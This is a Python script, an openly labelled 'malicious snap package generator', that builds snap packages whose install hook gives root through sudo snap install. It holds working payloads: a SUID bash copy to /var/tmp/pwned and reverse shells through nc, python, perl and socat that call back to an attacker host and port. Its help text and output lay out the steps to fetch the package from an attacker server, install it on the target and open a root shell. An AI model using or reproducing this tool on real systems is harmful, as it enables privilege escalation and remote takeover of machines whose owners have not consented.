#!/usr/bin/env python3
"""
Malicious Snap Package Generator

Generate snap packages for privilege escalation via:
    sudo snap install <package>.snap --dangerous --devmode

GTFOBins: https://gtfobins.github.io/gtfobins/snap/

IMPORTANT: All payloads are POSIX-compatible (/bin/sh, NOT bash-specific).
"""

import argparse
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path


# ============================================================================
# POSIX-Compatible Payloads (All use /bin/sh, not bash)
# ============================================================================

PAYLOADS = {
    # NOTE: Uses /var/tmp instead of /tmp because /tmp is often mounted nosuid on CentOS/RHEL
    "suid": """#!/bin/sh
cp /bin/bash /var/tmp/pwned
chmod 4755 /var/tmp/pwned
""",

    "revshell_nc": """#!/bin/sh
rm /var/tmp/f 2>/dev/null
mkfifo /var/tmp/f
cat /var/tmp/f | /bin/bash -i 2>&1 | nc {lhost} {lport} > /var/tmp/f &
""",

    "revshell_python": """#!/bin/sh
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' 2>/dev/null || \\
python -c 'import socket,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' &
false
""",

    "revshell_perl": """#!/bin/sh
perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");' &
false
""",

    "revshell_socat": """#!/bin/sh
socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport} &
false
""",

    "custom": """#!/bin/sh
{command}
false
"""
}


def check_fpm() -> bool:
    """Check if fpm is available."""
    return shutil.which("fpm") is not None


def check_mksquashfs() -> bool:
    """Check if mksquashfs is available."""
    return shutil.which("mksquashfs") is not None


def generate_hook(payload_type: str, **kwargs) -> str:
    """Generate POSIX-compatible install hook script."""
    if payload_type == "suid":
        return PAYLOADS["suid"]

    elif payload_type == "revshell":
        shell = kwargs.get("shell", "nc")
        lhost = kwargs.get("lhost")
        lport = kwargs.get("lport")

        if not lhost or not lport:
            raise ValueError("revshell requires --lhost and --lport")

        payload_key = f"revshell_{shell}"
        if payload_key not in PAYLOADS:
            raise ValueError(f"Unknown shell type: {shell}. Use: nc, python, perl, socat")

        return PAYLOADS[payload_key].format(lhost=lhost, lport=lport)

    elif payload_type == "custom":
        command = kwargs.get("cmd")
        if not command:
            raise ValueError("custom type requires --cmd")
        return PAYLOADS["custom"].format(command=command)

    else:
        raise ValueError(f"Unknown payload type: {payload_type}. Use: suid, revshell, custom")


def build_with_fpm(hook_content: str, name: str, output: str) -> Path:
    """Build snap using fpm."""
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir = Path(tmpdir)

        # Create directory structure
        hooks_dir = tmpdir / "meta" / "hooks"
        hooks_dir.mkdir(parents=True)

        # Write install hook
        install_hook = hooks_dir / "install"
        install_hook.write_text(hook_content)
        install_hook.chmod(0o755)

        # Build with fpm
        output_path = Path(output).resolve()
        cmd = [
            "fpm",
            "-n", name,
            "-s", "dir",
            "-t", "snap",
            "-a", "all",
            "--package", str(output_path),
            "meta"
        ]

        result = subprocess.run(cmd, cwd=tmpdir, capture_output=True, text=True)

        if result.returncode != 0:
            print(f"[!] fpm error: {result.stderr}", file=sys.stderr)
            raise RuntimeError("fpm build failed")

        return output_path


def build_with_mksquashfs(hook_content: str, name: str, output: str) -> Path:
    """Build snap using mksquashfs (fallback)."""
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir = Path(tmpdir)

        # Create directory structure
        snap_dir = tmpdir / "snap"
        hooks_dir = snap_dir / "meta" / "hooks"
        hooks_dir.mkdir(parents=True)

        # Write install hook
        install_hook = hooks_dir / "install"
        install_hook.write_text(hook_content)
        install_hook.chmod(0o755)

        # Create minimal snap.yaml
        snap_yaml = snap_dir / "meta" / "snap.yaml"
        snap_yaml.write_text(f"""name: {name}
version: '1.0'
summary: Package
description: Package
architectures: [all]
confinement: devmode
grade: devel
""")

        # Build with mksquashfs
        output_path = Path(output).resolve()
        cmd = [
            "mksquashfs",
            str(snap_dir),
            str(output_path),
            "-noappend",
            "-comp", "lzo",
            "-no-fragments"
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode != 0:
            print(f"[!] mksquashfs error: {result.stderr}", file=sys.stderr)
            raise RuntimeError("mksquashfs build failed")

        return output_path


def build_snap(hook_content: str, name: str, output: str, method: str = "auto") -> Path:
    """Build snap package using available method."""
    if method == "fpm" or (method == "auto" and check_fpm()):
        print("[*] Building with fpm...")
        return build_with_fpm(hook_content, name, output)
    elif method == "squash" or (method == "auto" and check_mksquashfs()):
        print("[*] Building with mksquashfs...")
        return build_with_mksquashfs(hook_content, name, output)
    else:
        raise RuntimeError("No build tool available. Install fpm: gem install fpm")


def main():
    parser = argparse.ArgumentParser(
        description="Generate malicious snap packages for privilege escalation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # SUID bash (most reliable)
  %(prog)s --type suid

  # Reverse shell with netcat
  %(prog)s --type revshell --lhost 10.10.16.10 --lport 4444

  # Reverse shell with python (if nc unavailable on target)
  %(prog)s --type revshell --lhost 10.10.16.10 --lport 4444 --shell python

  # Custom command
  %(prog)s --type custom --cmd "id > /tmp/proof"

Usage on target:
  curl http://ATTACKER/exploit.snap -o /tmp/x.snap
  sudo snap install /tmp/x.snap --dangerous --devmode
  /var/tmp/pwned -p   # Root shell (if using suid type)

NOTE: Uses /var/tmp instead of /tmp because /tmp is often mounted nosuid on CentOS/RHEL.
"""
    )

    parser.add_argument("--type", "-t", required=True,
                        choices=["suid", "revshell", "custom"],
                        help="Payload type: suid, revshell, or custom")

    parser.add_argument("--lhost", help="Listener IP (for revshell)")
    parser.add_argument("--lport", type=int, help="Listener port (for revshell)")
    parser.add_argument("--shell", default="nc",
                        choices=["nc", "python", "perl", "socat"],
                        help="Reverse shell method (default: nc)")

    parser.add_argument("--cmd", help="Custom command (for custom type)")

    parser.add_argument("--output", "-o", default="exploit.snap",
                        help="Output filename (default: exploit.snap)")
    parser.add_argument("--name", "-n", default="exploit",
                        help="Snap package name (default: exploit)")
    parser.add_argument("--method", "-m", default="auto",
                        choices=["auto", "fpm", "squash"],
                        help="Build method (default: auto)")

    args = parser.parse_args()

    # Generate hook content
    try:
        hook_content = generate_hook(
            args.type,
            lhost=args.lhost,
            lport=args.lport,
            shell=args.shell,
            cmd=args.cmd
        )
    except ValueError as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Payload type: {args.type}")
    if args.type == "revshell":
        print(f"[*] Shell method: {args.shell}")
        print(f"[*] Callback: {args.lhost}:{args.lport}")

    print("\n[*] Hook script:")
    print("-" * 40)
    print(hook_content)
    print("-" * 40)

    # Build snap
    try:
        output_path = build_snap(hook_content, args.name, args.output, args.method)
        print(f"\n[+] Success! Snap created: {output_path}")
        print(f"[+] Size: {output_path.stat().st_size} bytes")

        print("\n[*] Transfer to target:")
        print(f"    curl http://$(hostname -I | awk '{{print $1}}')/$(basename {output_path}) -o /tmp/x.snap")

        print("\n[*] Execute on target:")
        print("    sudo snap install /tmp/x.snap --dangerous --devmode")

        if args.type == "suid":
            print("\n[*] Get root shell:")
            print("    /var/tmp/pwned -p")
        elif args.type == "revshell":
            print(f"\n[*] Start listener first:")
            print(f"    nc -lvnp {args.lport}")

    except RuntimeError as e:
        print(f"[!] Build failed: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
